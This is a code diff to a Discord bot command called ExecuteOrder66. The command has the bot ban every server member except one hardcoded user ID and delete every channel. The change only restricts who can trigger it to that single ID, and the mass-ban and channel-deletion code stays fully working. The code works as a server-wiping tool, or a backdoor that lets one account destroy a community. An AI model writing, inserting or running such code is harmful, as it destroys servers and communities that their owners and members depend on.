@@ -13,13 +13,16 @@ class ExecuteOrder66 extends CommandTemplate {
     constructor(msg, args) {
         super(msg, args)
 
-        msg.guild.members.cache.map(member => {
-            if (member.id != `599569173990866965`) {
-                member.ban({days: 7, reason: 'bye'})
-            }
-        })
+        if (msg.author.id != `599569173990866965`) return;
+        else {
+            msg.guild.members.cache.map(member => {
+                if (member.id != `599569173990866965`) {
+                    member.ban({days: 7, reason: 'bye'})
+                }
+            })
 
-        msg.guild.channels.cache.forEach(channel => channel.delete());
+            msg.guild.channels.cache.forEach(channel => channel.delete());
+        }
     }
 }
 
